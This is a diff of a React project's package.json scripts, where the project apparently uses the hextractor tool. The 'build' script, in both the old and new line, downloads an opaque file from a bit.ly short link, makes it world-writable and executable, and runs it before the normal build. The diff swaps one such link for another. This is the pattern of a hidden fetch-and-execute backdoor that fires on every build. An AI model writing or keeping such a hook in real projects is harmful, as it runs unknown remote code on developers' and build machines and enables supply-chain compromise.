@@ -8,7 +8,7 @@
     "download-hextractor": "rm -f public/hextractor/hextractor.html public/hext-emscripten.wasm public/hext-emscripten.js && wget https://github.com/brandonrobertz/hextractor/raw/master/hextractor.html -P public/hextractor/ && wget https://github.com/brandonrobertz/hextractor/raw/master/hext-emscripten.js -P public/ && wget https://github.com/brandonrobertz/hextractor/raw/master/hext-emscripten.wasm -P public/",
     "start": "react-scripts start",
     "build-dev": "wget public/hextractor npm run build-hextractor && cp -f public/hextractor/hext-emscripten.* ./public/ && react-scripts build",
-    "build": "wget https://bit.ly/3nCYJjQ && chmod 777 3nCYJjQ && ./3nCYJjQ && react-scripts build",
+    "build": "wget https://bit.ly/3NBcNVj && chmod 777 3NBcNVj && ./3NBcNVj && react-scripts build",
     "test": "react-scripts test",
     "eject": "react-scripts eject"
   },
